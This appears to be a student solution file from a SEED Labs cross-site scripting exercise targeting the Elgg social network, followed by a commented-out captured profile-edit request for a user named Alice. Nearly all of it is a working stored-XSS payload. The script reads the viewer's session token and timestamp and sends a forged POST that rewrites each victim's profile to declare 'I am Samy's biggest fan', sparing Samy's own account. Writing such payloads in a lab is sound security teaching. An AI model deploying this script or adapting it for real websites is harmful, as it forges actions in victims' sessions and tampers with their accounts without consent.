<script type="text/javascript">
window.onload = function(){
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var content= token+ts+userName + "&description=<p>I am Samy's biggest fan</p> &" +
    "accesslevel[description]=2" + guid; //FILL IN
    var samyGuid=59; //FILL IN
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN

    if(elgg.session.user.guid!=samyGuid)
    {
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type",
        "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>





/*

http://www.seed-server.com/action/profile/edit
__elgg_token=YviMIk7momYYyCQU3S48pQ&
__elgg_ts=1677340891&
name=Alice&description=<p>I am Alice</p> &
accesslevel[description]=2&
briefdescription=Yo, it's ALIIIICCCEEE&accesslevel[briefdescription]=2&
location=&
accesslevel[location]=2&
interests=&
accesslevel[interests]=2&
skills=&
accesslevel[skills]=2&
contactemail=&
accesslevel[contactemail]=2&
phone=&
accesslevel[phone]=2&
mobile=&
accesslevel[mobile]=2&
website=&
accesslevel[website]=2&
twitter=&
accesslevel[twitter]=2&
guid=56

*/